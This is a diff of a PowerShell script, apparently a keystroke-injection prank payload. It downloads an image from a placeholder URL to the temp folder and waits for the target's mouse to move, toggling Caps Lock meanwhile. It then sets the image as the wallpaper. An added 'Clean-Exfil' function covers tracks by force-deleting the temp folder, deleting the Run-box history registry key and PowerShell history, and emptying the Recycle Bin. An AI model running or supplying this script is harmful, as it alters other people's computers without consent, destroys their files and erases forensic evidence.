@@ -2,7 +2,7 @@ $url = "WALLPAPER URL HERE"
 
 $ext = $url.split(".")[-1]
 
-$wp = "$Env:USERPROFILE\Desktop\---wp.$ext"
+$wp = "$Env:tmp\---wp.$ext"
 
 iwr $url -O $wp
 
@@ -65,5 +65,39 @@ public class Params
     $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 }
 
+function Target-Comes {
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
 
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+function Clean-Exfil { 
+
+# empty temp folder
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Empty recycle bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+}
+
+
+Target-Comes
 Set-WallPaper -Image $wp -Style Fill
+Clean-Exfil
